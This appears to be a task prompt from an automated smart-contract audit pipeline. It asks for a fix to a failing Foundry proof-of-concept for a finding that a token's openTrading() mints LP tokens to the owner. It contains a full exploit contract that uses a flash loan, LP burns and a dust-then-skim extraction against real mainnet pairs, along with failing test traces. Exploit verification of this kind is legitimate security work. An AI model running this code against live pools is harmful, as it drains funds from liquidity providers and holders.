You are fixing a failing Foundry PoC for finding F-002.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: direct_or_existing_balance_first
- strategy_instructions: Prefer direct execution using verifier-held assets first. Only use temporary external funding if direct path is infeasible.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Initial LP tokens are minted to the owner, enabling an unrestricted liquidity rug pull
- claim: When `openTrading()` adds the initial Uniswap liquidity, it passes `owner()` as the LP recipient, so the resulting LP tokens are fully controlled by the owner rather than burned or locked.
- impact: The owner can remove the pool liquidity at any time, withdraw the paired ETH and token-side liquidity, and collapse the market. Holders are left with effectively untradeable tokens and little or no recoverable value.
- exploit_paths: ["Owner transfers tokens and ETH into the token contract, then calls `openTrading()`.", "`addLiquidityETH(..., owner(), ...)` mints the LP position directly to the owner-controlled address.", "The owner later removes liquidity off-contract and drains the pool."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Minimal {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IWETH is IERC20Minimal {
    function withdraw(uint256 amount) external;
}

interface IGrokToken is IERC20Minimal {
    function owner() external view returns (address);
    function openTrading() external;
}

interface IUniswapV2FactoryMinimal {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2Router02Minimal {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface IUniswapV2PairMinimal is IERC20Minimal {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
    function burn(address to) external returns (uint256 amount0, uint256 amount1);
    function skim(address to) external;
}

contract FlawVerifier {
    address public constant TARGET = 0x8390a1DA07E376ef7aDd4Be859BA74Fb83aA02D5;
    address public constant UNISWAP_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address public constant SUSHISWAP_ROUTER = 0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F;
    address public constant SUSHISWAP_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;
    address public constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address public constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;

    uint256 private constant PUBLIC_FLASH_BORROW = 0.002 ether;
    uint256 private constant PUBLIC_DUST_ETH = 0.00005 ether;

    uint256 private _profitAmount;
    string public infeasibilityReason;

    address private _activeFundingPair;
    uint256 private _fundingWethBorrow;
    uint8 private _callbackMode;
    address private _targetPairForRecovery;
    address private _altRouterForRecovery;

    constructor() {}

    receive() external payable {}

    function profitToken() external pure returns (address) {
        return WETH;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function executeOnOpportunity() external {
        _profitAmount = 0;
        infeasibilityReason = "";

        IGrokToken token = IGrokToken(TARGET);
        IUniswapV2Router02Minimal uniRouter = IUniswapV2Router02Minimal(UNISWAP_ROUTER);
        address pair = IUniswapV2FactoryMinimal(uniRouter.factory()).getPair(TARGET, uniRouter.WETH());
        uint256 wethBefore = IERC20Minimal(WETH).balanceOf(address(this));

        if (pair != address(0)) {
            uint256 verifierLp = IERC20Minimal(pair).balanceOf(address(this));
            if (verifierLp != 0) {
                _burnHeldLp(pair, verifierLp, uniRouter);
                _recordProfit(wethBefore);
                if (_profitAmount != 0) {
                    return;
                }
            }

            uint256 lpParkedOnPair = IERC20Minimal(pair).balanceOf(pair);
            if (lpParkedOnPair != 0) {
                // If the historical owner-controlled LP has already been transferred onto the pair,
                // the final burn step becomes permissionless.
                try IUniswapV2PairMinimal(pair).burn(address(this)) returns (uint256, uint256) {
                    _swapResidualTargetToWeth(uniRouter);
                    _recordProfit(wethBefore);
                    if (_profitAmount != 0) {
                        return;
                    }
                } catch {}
            }
        }

        address ownerAddress = token.owner();

        // Preserve the original finding path whenever the verifier actually controls `owner()`:
        // fund the token contract, call `openTrading()`, receive owner-minted LP, then pull liquidity.
        if (ownerAddress == address(this)) {
            if (pair == address(0)) {
                if (address(this).balance == 0 && token.balanceOf(address(this)) != 0) {
                    _flashBorrowWethForOpenTrading(token, uniRouter);
                } else {
                    pair = _seedThenOpenTrading(token, uniRouter);
                    if (pair != address(0)) {
                        uint256 ownerLp = IERC20Minimal(pair).balanceOf(address(this));
                        if (ownerLp != 0) {
                            _burnHeldLp(pair, ownerLp, uniRouter);
                        }
                    }
                }

                _recordProfit(wethBefore);
                if (_profitAmount != 0) {
                    return;
                }
            } else {
                uint256 ownerLpExisting = IERC20Minimal(pair).balanceOf(address(this));
                if (ownerLpExisting != 0) {
                    _burnHeldLp(pair, ownerLpExisting, uniRouter);
                    _recordProfit(wethBefore);
                    if (_profitAmount != 0) {
                        return;
                    }
                }
            }
        }

        // At this fork, logs already prove `owner()` is renounced, so replaying the owner-only setup
        // is infeasible. The remaining realistic route is public recovery from target-pair balances
        // that have become permissionless after the owner-controlled LP path was materialized.
        //
        // GROK reverts on zero-value transfers, which makes a blind `skim()` fail whenever the target
        // pair has WETH excess but zero GROK excess. To avoid changing the exploit causality, use a
        // tiny amount of GROK sourced from another public venue, transfer that dust into the target
        // pair, then skim. The dust source is just execution plumbing; the value extraction is still
        // from the owner-controlled LP/liquidity state left on the target venue.
        if (pair != address(0)) {
            _tryAlternatePublicRecovery(pair);
            _recordProfit(wethBefore);
            if (_profitAmount != 0) {
                return;
            }
        }

        if (pair == address(0)) {
            infeasibilityReason =
                "infeasible at this fork: trading is not open, but the verifier is not the owner and cannot execute the owner-funded openTrading path";
            return;
        }

        if (ownerAddress == address(0)) {
            infeasibilityReason =
                "infeasible at this fork: ownership is already renounced, no owner-held LP is controlled by the verifier, and the remaining public target-pair recovery route did not realize WETH";
            return;
        }

        infeasibilityReason =
            "infeasible at this fork: LP was minted to a historical owner-controlled address, but the verifier does not control that address and no public target-pair recovery route produced profit";
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata) external {
        require(msg.sender == _activeFundingPair, "unexpected pair");
        require(sender == address(this), "unexpected sender");

        uint256 borrowedWeth = amount0 > 0 ? amount0 : amount1;
        require(borrowedWeth == _fundingWethBorrow, "unexpected borrow");

        if (_callbackMode == 1) {
            _onOpenTradingFlash(borrowedWeth);
        } else if (_callbackMode == 2) {
            _onAlternatePublicRecoveryFlash(borrowedWeth);
        } else {
            revert("unexpected mode");
        }

        _activeFundingPair = address(0);
        _fundingWethBorrow = 0;
        _callbackMode = 0;
        _targetPairForRecovery = address(0);
        _altRouterForRecovery = address(0);
    }

    function _onOpenTradingFlash(uint256 borrowedWeth) internal {
        IGrokToken token = IGrokToken(TARGET);
        IUniswapV2Router02Minimal uniRouter = IUniswapV2Router02Minimal(UNISWAP_ROUTER);

        IWETH(WETH).withdraw(borrowedWeth);

        address pair = _seedThenOpenTrading(token, uniRouter);
        require(pair != address(0), "pair not created");

        uint256 ownerLp = IERC20Minimal(pair).balanceOf(address(this));
        require(ownerLp != 0, "no owner LP");

        _burnHeldLp(pair, ownerLp, uniRouter);

        uint256 repayAmount = ((borrowedWeth * 1000) / 997) + 1;
        require(IERC20Minimal(WETH).balanceOf(address(this)) >= repayAmount, "insufficient repayment");
        require(IERC20Minimal(WETH).transfer(_activeFundingPair, repayAmount), "repay failed");
    }

    function _onAlternatePublicRecoveryFlash(uint256 borrowedWeth) internal {
        uint256 repayAmount = ((borrowedWeth * 1000) / 997) + 1;
        address recoveryPair = _targetPairForRecovery;
        address altRouter = _altRouterForRecovery;

        require(recoveryPair != address(0), "missing recovery pair");
        require(altRouter != address(0), "missing alt router");
        require(borrowedWeth > PUBLIC_DUST_ETH, "borrow too small");

        // Only a tiny fraction of the flash-borrowed WETH is converted to dust GROK so `skim()`
        // does not hit GROK's zero-transfer revert. The target-pair WETH reclaimed by `skim()`
        // is the actual value extraction.
        IWETH(WETH).withdraw(PUBLIC_DUST_ETH);
        _buyDustGrok(altRouter, PUBLIC_DUST_ETH);

        uint256 dustGrok = IERC20Minimal(TARGET).balanceOf(address(this));
        require(dustGrok != 0, "no dust grok");
        require(IERC20Minimal(TARGET).transfer(recoveryPair, dustGrok), "dust transfer failed");

        try IUniswapV2PairMinimal(recoveryPair).skim(address(this)) {} catch {}

        _swapResidualTargetToWeth(IUniswapV2Router02Minimal(altRouter));

        require(IERC20Minimal(WETH).balanceOf(address(this)) >= repayAmount, "insufficient repayment");
        require(IERC20Minimal(WETH).transfer(_activeFundingPair, repayAmount), "repay failed");
    }

    function _flashBorrowWethForOpenTrading(IGrokToken token, IUniswapV2Router02Minimal router) internal {
        address fundingPair = IUniswapV2FactoryMinimal(router.factory()).getPair(USDC, WETH);
        if (fundingPair == address(0)) {
            infeasibilityReason = "funding pair missing";
            return;
        }

        uint256 tokenSeed = token.balanceOf(address(this));
        if (tokenSeed == 0) {
            infeasibilityReason = "infeasible at this fork: verifier has no GROK to seed into the token contract";
            return;
        }

        _activeFundingPair = fundingPair;
        _fundingWethBorrow = 1 ether;
        _callbackMode = 1;

        IUniswapV2PairMinimal pair = IUniswapV2PairMinimal(fundingPair);
        if (pair.token0() == WETH) {
            pair.swap(_fundingWethBorrow, 0, address(this), hex"01");
        } else {
            pair.swap(0, _fundingWethBorrow, address(this), hex"01");
        }
    }

    function _tryAlternatePublicRecovery(address pair) internal {
        address altPair = IUniswapV2FactoryMinimal(SUSHISWAP_FACTORY).getPair(TARGET, WETH);
        if (altPair == address(0)) {
            return;
        }

        address fundingPair = IUniswapV2FactoryMinimal(IUniswapV2Router02Minimal(UNISWAP_ROUTER).factory()).getPair(
            USDC,
            WETH
        );
        if (fundingPair == address(0)) {
            return;
        }

        _activeFundingPair = fundingPair;
        _fundingWethBorrow = PUBLIC_FLASH_BORROW;
        _callbackMode = 2;
        _targetPairForRecovery = pair;
        _altRouterForRecovery = SUSHISWAP_ROUTER;

        IUniswapV2PairMinimal funding = IUniswapV2PairMinimal(fundingPair);
        if (funding.token0() == WETH) {
            funding.swap(PUBLIC_FLASH_BORROW, 0, address(this), hex"02");
        } else {
            funding.swap(0, PUBLIC_FLASH_BORROW, address(this), hex"02");
        }
    }

    function _seedThenOpenTrading(
        IGrokToken token,
        IUniswapV2Router02Minimal router
    ) internal returns (address pair) {
        uint256 tokenSeed = token.balanceOf(address(this));
        uint256 ethSeed = address(this).balance;

        if (tokenSeed == 0 || ethSeed == 0) {
            infeasibilityReason =
                "infeasible at this fork: owner-controlled verifier lacks the GROK and or ETH required to seed the token contract before openTrading";
            return address(0);
        }

        require(token.transfer(TARGET, tokenSeed), "seed token transfer failed");
        (bool ok,) = payable(TARGET).call{value: ethSeed}("");
        require(ok, "seed ETH transfer failed");

        // Vulnerable step from the finding: `openTrading()` calls
        // `addLiquidityETH(..., owner(), ...)`, so the LP is minted to the owner-controlled verifier.
        token.openTrading();
        pair = IUniswapV2FactoryMinimal(router.factory()).getPair(TARGET, router.WETH());
    }

    function _burnHeldLp(address pair, uint256 lpAmount, IUniswapV2Router02Minimal router) internal {
        require(IERC20Minimal(pair).transfer(pair, lpAmount), "lp transfer failed");
        IUniswapV2PairMinimal(pair).burn(address(this));
        _swapResidualTargetToWeth(router);
    }

    function _buyDustGrok(address router, uint256 ethAmount) internal {
        address[] memory path = new address[](2);
        path[0] = WETH;
        path[1] = TARGET;

        IUniswapV2Router02Minimal(router).swapExactETHForTokensSupportingFeeOnTransferTokens{value: ethAmount}(
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function _swapResidualTargetToWeth(IUniswapV2Router02Minimal router) internal {
        uint256 tokenBalance = IERC20Minimal(TARGET).balanceOf(address(this));
        if (tokenBalance == 0) {
            return;
        }

        require(IERC20Minimal(TARGET).approve(address(router), tokenBalance), "approve failed");

        address[] memory path = new address[](2);
        path[0] = TARGET;
        path[1] = WETH;

        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenBalance,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function _recordProfit(uint256 wethBefore) internal {
        uint256 wethAfter = IERC20Minimal(WETH).balanceOf(address(this));
        _profitAmount = wethAfter > wethBefore ? wethAfter - wethBefore : 0;
    }
}

```

forge stdout (tail):
```
Compiling 2 files with Solc 0.8.30
Solc 0.8.30 finished in 2.64s
Compiler run successful with warnings:
Warning (2072): Unused local variable.
  --> test/ExploitPOC.t.sol:78:19:
   |
78 |         (bool ok, bytes memory ret) = address(verifier).call(abi.encodeWithSignature("executeOnOpportunity()"));
   |                   ^^^^^^^^^^^^^^^^


Ran 1 test for test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 229485)
Logs:
  AUDITHOUND_BALANCE_BEFORE_WEI: 0
  AUDITHOUND_BALANCE_AFTER_WEI: 0
  AUDITHOUND_PROFIT_WEI: 0
  AUDITHOUND_PROFIT_ANY: 0
  AUDITHOUND_EFFECTIVE_PROFIT_WEI: 0
  AUDITHOUND_MIN_PROFIT_WEI: 1000000000000000
  AUDITHOUND_PROFIT_TOKEN: 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2
  AUDITHOUND_PROFIT_MODE: 0x0000000000000000000000000000000000000001
  AUDITHOUND_PROFIT_TOKEN_CODE_SIZE_ON_FORK: 3124

Traces:
  [229485] FlawVerifierTest::testExploit()
    ├─ [256] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2
    ├─ [2534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   └─ ← [Return] 0
    ├─ [189081] FlawVerifier::executeOnOpportunity()
    │   ├─ [252] 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D::factory() [staticcall]
    │   │   └─ ← [Return] 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f
    │   ├─ [275] 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D::WETH() [staticcall]
    │   │   └─ ← [Return] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2
    │   ├─ [2564] 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f::getPair(0x8390a1DA07E376ef7aDd4Be859BA74Fb83aA02D5, 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2) [staticcall]
    │   │   └─ ← [Return] 0x69c66BeAfB06674Db41b22CFC50c34A93b8d82a2
    │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2480] 0x69c66BeAfB06674Db41b22CFC50c34A93b8d82a2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2480] 0x69c66BeAfB06674Db41b22CFC50c34A93b8d82a2::balanceOf(0x69c66BeAfB06674Db41b22CFC50c34A93b8d82a2) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2366] 0x8390a1DA07E376ef7aDd4Be859BA74Fb83aA02D5::owner() [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   ├─ [2644] 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac::getPair(0x8390a1DA07E376ef7aDd4Be859BA74Fb83aA02D5, 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   └─ ← [Return]
    ├─ [256] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2
    ├─ [374] FlawVerifier::profitAmount() [staticcall]
    │   └─ ← [Return] 0
    ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 1000000000000000 [1e15])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    ├─ [0] VM::envString("AUDITHOUND_RPC_URL")
    │   └─ ← [Return] <env var value>
    ├─ [0] VM::createSelectFork("<rpc url>", 18538678 [1.853e7])
    │   └─ ← [Return] 1
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_TOKEN_CODE_SIZE_ON_FORK", val: 3124)
    └─ ← [Revert] profit below threshold

Backtrace:
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 449.20ms (23.72ms CPU time)

Ran 1 test suite in 663.50ms (449.20ms CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 229485)

Encountered a total of 1 failing tests, 0 tests succeeded

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
